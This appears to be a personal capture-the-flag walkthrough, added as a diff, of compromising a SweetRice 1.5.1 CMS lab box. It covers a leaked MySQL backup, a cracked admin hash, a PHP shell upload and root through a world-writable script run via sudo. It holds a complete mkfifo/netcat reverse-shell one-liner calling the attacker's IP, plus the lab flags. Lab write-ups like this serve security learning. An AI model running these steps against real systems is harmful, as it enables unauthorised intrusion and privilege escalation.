@@ -1,0 +1,94 @@
+
+2 ports were open 22 and 80
+
+
+In: http://10.10.211.32/content/
+
+----> Welcome to SweetRice - Thank your for install SweetRice as your website management system.
+
+In: http://10.10.211.32/content/inc/latest.txt
+
+----> 1.5.1 
+
+Something Version
+
+So, adding above things:
+
+Sweet rice version-1.5.1
+
+$ searchsploit SweetRice
+
+In: http://10.10.211.32/content/inc/mysql_backup/
+
+----> mysql_bakup_20191129023059-1.5.1.sql
+
+I viewed the sql file in: https://bfotool.com/sql-to-text
+
+So that I can copy the sql content as paste as text in file.
+
+then used: cat sql-content.txt | grep user/username/admin
+
+NOTE: Though I came to know it can be opened via sublimetext text as well
+
+-----> manager (admin was there in file)
+
+-----> hashed pass : 42f749ade7f9e195bf475f37a44cafcb ---> At 1st I thought it was password, but with this Ifailed to login.
+
+I used Crackstation: pass : Password123
+
+I thought, I can use this pass to login via ssh, but I was wrong.
+
+With this I can use it to login: http://10.10.211.32/content/as/
+
+In: http://10.10.211.32/content/as/?type=media_center
+
+I actually uploaded .php5 file.
+
+Then we started netcat as listener
+
+----> We then executed the file in website or by simply using: curl <address> 
+
+WE then got a shell, used: python3 -c 'import pty;pty.spawn("/bin/bash")'
+		     used: ctrl + Z
+                     used: stty -echo raw
+		     used: export TERM=xterm		
+`
+In /home/itguy ---> User.txt: THM{63e5bce9271952aad1113b6f1ac28a07}
+
+Now: see: piv-escalate.png
+
+" (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl "
+
+So here, we have to execute this file
+
+We can't expoit SUID as no scope id present.
+
+$ cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+
+$ ls -l /etc/copy.sh        
+-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
+
+----> Here, priv=7 for other users!!
+
+used : echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.112.253 7777 >/tmp/f" > /etc/copy.sh
+
+Got from pentestmonkey
+
+Now: started another netcat listner
+
+Now : sudo -l ---> $ sudo /usr/bin/perl /home/itguy/backup.pl 
+
+NOw we got the root shell
+
+root.txt ----->  THM{6637f41d0177b6f37cb20d775124699f}
+
+
+Though many thing be done : "There might be multiple ways to get user access."
+
+
+We will now use the exploit...
+
+
